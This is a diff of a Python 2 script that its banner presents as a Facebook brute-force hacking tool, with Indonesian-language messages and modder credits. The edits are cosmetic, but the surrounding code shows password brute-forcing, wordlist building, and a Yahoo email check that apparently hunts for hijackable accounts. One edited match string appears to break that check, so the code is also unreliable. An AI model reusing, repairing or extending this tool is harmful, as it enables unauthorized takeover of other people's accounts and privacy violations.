@@ -49,10 +49,10 @@ def banner():
     print GG+"  √=============================================√"
     print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: NICOLEUS AJAH!!             |"
+    print WW+"  |            MOD BY: NICOLEUS AJAH!!          |"
     print GL+"  |       Ngocok Dulu Sebelum Menggunakan       |"
-    print WW+"  |            FACEBOOK: nicoleus            |"
-    print Y+"  |             YOUTUBE: Ady sitorus ady|"
+    print WW+"  |            FACEBOOK: nicoleus               |"
+    print Y+"   |             YOUTUBE: Ady sitorus ady        |"
     print GL+"  |---------------------------------------------|"
     print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
     print GL+"  |---------------------------------------------|"
@@ -181,7 +181,7 @@ def menu():
             login()
         except requests.exceptions.ConnectionError:
             print logo
-            print '\x1b[1;91m[!] Tidak Ada Koneksi'
+            print '\x1b[1;91m[!] Tidak Ada Koneksi Bangee'
             keluar()
 
     os.system('clear')
@@ -816,7 +816,7 @@ def brute():
 
 
 def tanyaw():
-    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist lae!! ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
+    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlistNya lae!! ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
     if why == '':
         print '\x1b[1;91m[!] Mohon Pilih Lae!! \x1b[1;97m(y/t)'
         tanyaw()
@@ -989,7 +989,7 @@ def yahoolist():
                 print '\x1b[1;91m ' + mail
                 continue
 
-            if '"messages.ERROR_INVALID_USERNAME">' in pek:
+            if '"messages.ERROR_INVALID_USERNAME_BANGEE">' in pek:
                 save.write(mail + '\n')
                 print '\x1b[1;92m ' + mail
             else:
